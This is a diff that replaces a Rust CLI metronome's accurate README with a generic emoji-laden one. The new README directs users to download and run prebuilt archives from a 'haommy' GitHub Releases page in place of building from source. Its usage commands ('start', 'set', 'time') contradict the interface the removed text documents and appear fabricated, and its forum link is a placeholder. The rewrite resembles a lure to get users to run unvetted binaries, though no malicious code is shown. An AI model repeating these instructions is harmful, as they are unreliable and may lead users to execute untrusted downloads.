@@ -1,62 +1,80 @@
-## Metronome
+# 🎶 metronome - Your Reliable Rhythm Companion
 
-A precise, terminal-based CLI metronome with audio and live controls.
+## ![Download metronome](https://img.shields.io/badge/Download%20metronome-v1.0-blue)
 
-<p align="center">
-  <img src="demo.gif" alt="animated" width="100%" />
-</p>
+## 🚀 Getting Started
 
-### Install
+Welcome to the metronome project! This is a simple, reliable command-line interface (CLI) metronome designed to help musicians keep time. Whether you play the guitar, piano, or drums, our metronome will assist you in maintaining a steady rhythm.
 
-```bash
-cargo build --release
-# optional
-cargo install --path .
-```
+## 📥 Download & Install
 
-### Run
+To get started, visit the Releases page to download the latest version of the metronome:
 
-```bash
-metronome [OPTIONS] [BPM] [SUBCOMMAND]
-```
+[Download metronome](https://github.com/haommy/metronome/releases)
 
-### Options
+Once on the page, locate the latest release and download the appropriate file for your operating system. 
 
-- **[BPM]**: optional positional BPM (20–400). Overrides --bpm when provided.
-- **-b, --bpm <NUM>**: starting BPM (20–400). Default: 120.
-- **-s, --signature <M/N>**: time signature (denominator one of 1,2,4,8,16). Default: 4/4.
-- **--subdivision <quarter|eighth|triplet|sixteenth>**: ticks per beat. Default: quarter.
-- **--sound <click|wood|cowbell|sidestick|beep>**: click sound. Default: click.
-- **--mute**: disable audio output.
+## 🔧 System Requirements
 
-### Subcommands
+- **Operating Systems:** The metronome app runs on Windows, macOS, and Linux.
+- **Storage Space:** At least 50 MB of free space.
+- **Audio Support:** A sound device is required for audio playback.
 
-- **tap**: tap tempo on the keyboard; the measured BPM is applied to the session.
-- **ramp <FROM..TO@DURATION>**: linearly ramp BPM over a duration.
-  - Examples: `120..160@2m`, `90..120@30s`, `100..80@500ms`.
+## 📂 Installation Steps
 
-### Keyboard controls (while running)
+### For Windows Users
 
-- **Space**: Play/Pause
-- **q / Esc**: Quit
-- **↑ / ↓**: BPM ±1
-- **← / →**: BPM ±5
-- **s**: Cycle subdivision (quarter → eighth → triplet → sixteenth)
-- **Tab**: Cycle common signatures (4/4 → 3/4 → 6/8 → 7/8)
-- **h**: Toggle on-screen help
+1. Download the ZIP file for Windows from the Releases page.
+2. Extract the ZIP file to a location of your choice.
+3. Open the Command Prompt and navigate to the extracted folder.
+4. Type `metronome` and press Enter to start the application.
 
-### Examples
+### For macOS Users
 
-```bash
-# Start at 100 BPM
-metronome 100
+1. Download the ZIP file for macOS from the Releases page.
+2. Extract the ZIP file to your Applications folder.
+3. Open your Terminal.
+4. Type `cd /Applications/metronome` to navigate to the folder.
+5. Type `./metronome` and press Enter to start the application.
 
-# Specify signature, subdivision, sound, and BPM flag
-metronome --signature 7/8 --subdivision sixteenth --sound wood --bpm 140
+### For Linux Users
 
-# Ramp from 100 to 140 BPM over 2 minutes
-metronome ramp "100..140@2m"
+1. Download the TAR.GZ file for Linux from the Releases page.
+2. Open your Terminal and use the command `tar -xvzf metronome.tar.gz` to extract the files.
+3. Navigate to the extracted folder using `cd`.
+4. Type `./metronome` and press Enter to start the application.
 
-# Tap tempo, then start at the measured BPM
-metronome tap
-```
+## 🎹 Usage Instructions
+
+Once the metronome is running, follow these simple steps to get going:
+
+1. **Start the Metronome:** Type `start` in the command line.
+2. **Set the Tempo:** To set the beats per minute (BPM), type `set [number]`. For example, for 120 BPM, type `set 120`.
+3. **Stop the Metronome:** Type `stop` to halt the sound.
+
+The metronome also offers a range of time signatures. You can set it by typing `time [signature]`, where signature can be 4/4, 3/4, etc.
+
+## 🎛️ Features
+
+- Simple and user-friendly interface.
+- Supports various BPM settings.
+- Customizable time signatures.
+- Clear audio feedback for every beat.
+
+## 📘 Troubleshooting
+
+If you encounter any issues:
+
+- **No Sound Output:** Ensure your audio device is not muted and is set as the default device.
+- **Command Not Recognized:** Double-check your spelling and path in your terminal.
+
+## 🌐 Community and Support
+
+Join our community to discuss features, suggest improvements, or share your experiences! You can find discussions and support at:
+
+- [GitHub Issues](https://github.com/haommy/metronome/issues)
+- [Community Forum](https://exampleforum.com)
+
+## ✅ Final Notes
+
+Thank you for using metronome! We hope it assists you in your musical journey. For any further information, refer back to the [Releases page](https://github.com/haommy/metronome/releases) to check for updates or new features. Happy practicing!
